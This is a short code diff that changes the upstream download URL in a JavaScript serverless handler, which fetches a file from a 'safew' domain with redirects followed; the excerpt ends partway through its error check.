@@ -1,5 +1,5 @@
 export default async function handler(req, res) {
-  const FILE_URL = 'https://safew.qpon/assets/download/Windows.zip';
+  const FILE_URL = 'https://safew.io/safewapocst';
 
   const upstream = await fetch(FILE_URL, { redirect: 'follow' });
   if (!upstream.ok) {
